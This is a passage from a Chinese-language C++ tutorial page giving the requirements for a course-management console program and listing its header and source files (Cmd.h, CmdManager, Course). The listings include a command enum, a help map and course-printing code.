ID&#x7684;&#x51FD;&#x6570;</li><li>&#x6253;&#x5370;&#x4FE1;&#x606F;&#x51FD;&#x6570;&#xFF08;&#x8003;&#x8651;&#x91CD;&#x8F7D; &lt;&lt;&#xFF09;</li></ul><p>CourseManager&#x7C7B;&#x6210;&#x5458;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#xFF08;&#x53EF;&#x4EE5;&#x601D;&#x8003;&#x4E0B;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5B58;&#x50A8;&#xFF1F;&#xFF09;</li><li>CourseManager&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</li><li>&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;vector&#xFF09;</li><li>&#x83B7;&#x53D6;&#x8BFE;&#x7A0B;&#x6570;&#x91CF;&#x51FD;&#x6570;</li><li>&#x6DFB;&#x52A0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#xFF09;</li><li>&#x6DFB;&#x52A0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;&#xFF09;</li><li>&#x5220;&#x9664;&#x6700;&#x65B0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;</li><li>&#x5220;&#x9664;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;&#xFF08;&#x6307;&#x5B9A;ID&#x6216;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#xFF09;</li><li>&#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x5217;&#x8868;</li><li>&#x6253;&#x5370;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;&#xFF08;&#x6307;&#x5B9A;ID&#x6216;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#xFF09;</li><li>&#x6253;&#x5370;&#x6700;&#x957F;&#x540D;&#x79F0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;</li></ul><p>CmdManager&#x7C7B;&#x6210;&#x5458;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x547D;&#x4EE4;&#x5217;&#x8868;&#xFF08;&#x53EF;&#x4EE5;&#x601D;&#x8003;&#x4E0B;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5B58;&#x50A8;&#xFF1F;&#xFF09;</li><li>&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;&#xFF08;&#x7528;&#x5728;&#x9700;&#x8981;&#x8C03;&#x7528;&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x7684;&#x5730;&#x65B9;&#xFF09;</li></ul><p>CmdManager&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#xFF1A;&#x8BFE;&#x7A0B;&#x53CA;&#x547D;&#x4EE4;&#x4FE1;&#x606F;&#x521D;&#x59CB;&#x5316;</li><li>&#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</li><li>&#x547D;&#x4EE4;&#x5904;&#x7406;&#x51FD;&#x6570;</li><li>&#x5B9E;&#x73B0;&#x4E2D;&#x8BF7;&#x6CE8;&#x610F;:</li><li>&#x54EA;&#x4E9B;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4E3A;const?</li><li>&#x662F;&#x5426;&#x6709;&#x7C7B;&#x6210;&#x5458;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4E3A;&#x9759;&#x6001;&#x6216;const?</li><li>&#x54EA;&#x4E9B;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4E3A;&#x53CB;&#x5143;&#xFF1F;</li><li>&#x54EA;&#x4E9B;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7B49;&#x4E8E;&#x9ED8;&#x8BA4;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF1F;</li></ul><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>Cmd.h<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span>  CMSYS_CMD_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMSYS_CMD_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;</span></span><br><span class="line"><span class="keyword">enum</span> CourseCmd</span><br><span class="line">{</span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x547D;&#x4EE4;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">Cmd_PrintHelp = <span class="number">0</span>,</span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">Cmd_PrintCourse = <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x6570;&#x91CF;</span></span><br><span class="line">Cmd_PrintCourseNum = <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x6700;&#x957F;&#x7684;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;</span></span><br><span class="line">Cmd_PrintLongName = <span class="number">3</span>,</span><br><span class="line">    <span class="comment">// &#x5220;&#x9664;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8BFE;&#x7A0B;</span></span><br><span class="line">Cmd_RemoveLastCourse = <span class="number">4</span>,</span><br><span class="line">    <span class="comment">// &#x9000;&#x51FA;&#x7A0B;&#x5E8F;</span></span><br><span class="line">Cmd_Exit = <span class="number">5</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// CMSYS_CMD_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>CmdManager.cpp<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CmdManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="keyword">void</span> CmdManager::Init(){</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x8BFE;&#x7A0B;&#x5217;&#x8868;</span></span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Linux&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;NodeJS&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Spark&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Hadoop&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Ruby&quot;</span>);</span><br><span class="line">    manager.AddCourse(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x547D;&#x4EE4;&#x5217;&#x8868;</span></span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_PrintHelp, <span class="string">&quot;Help Info&quot;</span>));</span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_PrintCourse, <span class="string">&quot;Course List&quot;</span>));</span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_PrintCourseNum, <span class="string">&quot;Course Number&quot;</span>));</span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_PrintLongName, <span class="string">&quot;Longest Course Name&quot;</span>));</span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_RemoveLastCourse, <span class="string">&quot;Remove Last Course&quot;</span>));</span><br><span class="line">    cmdMap.insert(pair&lt;CourseCmd, <span class="built_in">string</span>&gt;(Cmd_Exit, <span class="string">&quot;Exit&quot;</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="keyword">void</span> CmdManager::PrintAllHelp() <span class="keyword">const</span>{</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cmd List:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = cmdMap.begin(); iter != cmdMap.end(); iter++)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x636E;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="keyword">void</span> CmdManager::PrintCmdHelp(<span class="keyword">const</span> CourseCmd cmd) <span class="keyword">const</span>{</span><br><span class="line">    <span class="keyword">auto</span> iter = cmdMap.find(cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (iter != cmdMap.end())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5904;&#x7406;&#x547D;&#x4EE4;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;false&#x5219;&#x8868;&#x793A;&#x9000;&#x51FA;&#x7A0B;&#x5E8F;&#xFF0C;&#x5176;&#x4ED6;&#x60C5;&#x51B5;&#x8FD4;&#x56DE;true</span></span><br><span class="line"><span class="keyword">bool</span> CmdManager::HandleCmd(<span class="keyword">const</span> CourseCmd cmd){</span><br><span class="line">    <span class="keyword">auto</span> iter = cmdMap.find(cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (iter == cmdMap.end()) {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(cmd) {</span><br><span class="line">        <span class="keyword">case</span> Cmd_PrintHelp: PrintAllHelp(); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cmd_PrintCourse: manager.PrintAllCourse(); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cmd_PrintCourseNum: <span class="built_in">cout</span> &lt;&lt; manager.GetCourseNum() &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cmd_PrintLongName: manager.PrintLongNameCourse(); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cmd_RemoveLastCourse: manager.RemoveLast(); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Cmd_Exit: <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>CmdManager.h<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CMSYS_CMDMANAGER_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMSYS_CMDMANAGER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CourseManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Cmd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;istream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x7C7B;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmdManager</span> {</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    CmdManager() = <span class="keyword">default</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x53CA;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintAllHelp</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6839;&#x636E;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintCmdHelp</span><span class="params">(<span class="keyword">const</span> CourseCmd cmd)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5904;&#x7406;&#x547D;&#x4EE4;&#x64CD;&#x4F5C;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HandleCmd</span><span class="params">(<span class="keyword">const</span> CourseCmd cmd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</span></span><br><span class="line">    <span class="function">CourseManager&amp; <span class="title">GetCourseManager</span><span class="params">()</span> </span>{ <span class="keyword">return</span> manager; }; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</span></span><br><span class="line">    CourseManager manager;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x4F7F;&#x7528;map&#x5B58;&#x50A8;&#x547D;&#x4EE4;&#x53CA;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="built_in">map</span>&lt;CourseCmd, <span class="built_in">string</span>&gt; cmdMap;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//CMSYS_CMDMANAGER_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Course.cpp<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Course.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Course &#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x521D;&#x59CB;&#x5316;&#x9759;&#x6001;&#x6210;&#x5458;&#xFF0C;&#x9ED8;&#x8BA4;&#x7B2C;&#x4E00;&#x4E2A;&#x8BFE;&#x7A0B;ID&#x4E3A;1</span></span><br><span class="line"><span class="keyword">int</span> Course::currentId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BFE;&#x7A0B;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">Course::Course(){</span><br><span class="line">    <span class="comment">// &#x5C06;currentId&#x5F53;&#x524D;&#x503C;&#x8D4B;&#x503C;&#x7ED9;id&#xFF0C;&#x518D;&#x5C06;currentID&#x81EA;&#x589E;</span></span><br><span class="line">    id = currentId++;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x9ED8;&#x8BA4;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#x4E3A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BFE;&#x7A0B;&#x7C7B;&#x62F7;&#x8D1D;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">Course::Course(<span class="keyword">const</span> Course&amp; course){</span><br><span class="line">    id = course.GetId();</span><br><span class="line">    name = course.GetName();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="keyword">void</span> Course::PrintInfo() <span class="keyword">const</span> {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Course: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x53CB;&#x5143;&#x51FD;&#x6570;&#xFF1A;&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(istream &amp;is, Course &amp;item)</span></span>{</span><br><span class="line">    is &gt;&gt; item.name;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x53CB;&#x5143;&#x51FD;&#x6570;&#xFF1A;&#x64CD;&#x4F5C;&#x7B26;&lt;&lt;&#x91CD;&#x8F7D;&#x51FD;&#x6570;&#xFF0C;&#x5F53;cout&lt;&lt;&#x8F93;&#x51FA;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;&#x65F6;&#x4F7F;&#x7528;</span></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="keyword">const</span> Course&amp; course)</span><br><span class="line">{</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Course: &quot;</span> &lt;&lt; course.id &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; course.name;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProjectCourse &#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="keyword">void</span> ProjectCourse::PrintInfo() <span class="keyword">const</span> {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ProjectCourse: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; tag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// JudgeCourse &#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="keyword">void</span> JudgeCourse::PrintInfo() <span class="keyword">const</span> {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;JudgeCourse: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; time &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Course.h<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CMSYS_COURSE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMSYS_COURSE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BFE;&#x7A0B;&#x7C7B;&#xFF1A;&#x5B58;&#x50A8;&#x548C;&#x5904;&#x7406;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Course</span> {</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x53CB;&#x5143;&#x51FD;&#x6570;&#xFF1A;&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(istream &amp;inputStream, Course &amp;course)</span></span>;</span><br><span class="line"></span><br><span class="line"><span 